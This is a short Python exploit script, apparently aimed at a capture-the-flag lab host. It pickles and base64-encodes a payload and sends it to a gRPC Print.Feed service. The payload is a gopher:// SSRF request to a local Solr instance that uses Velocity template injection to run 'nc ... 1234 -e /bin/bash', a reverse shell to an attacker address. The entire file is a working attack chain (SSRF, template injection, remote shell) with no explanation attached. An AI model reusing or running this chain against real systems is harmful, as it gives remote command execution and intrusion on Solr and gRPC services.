import base64
import pickle
import os

data1 = '{"feed_url":"gopher://localhost:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27nc%2010.10.1**.**%201234%20-e%20%2Fbin%2Fbash%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end", "id":"2"}'
data = base64.b64encode(pickle.dumps(data1))
os.system("""grpcurl -plaintext -d '{\"data\":\"%s\"}' -proto lol.proto 10.10.10.201:9000 Print.Feed 2>&1""" % data.decode())
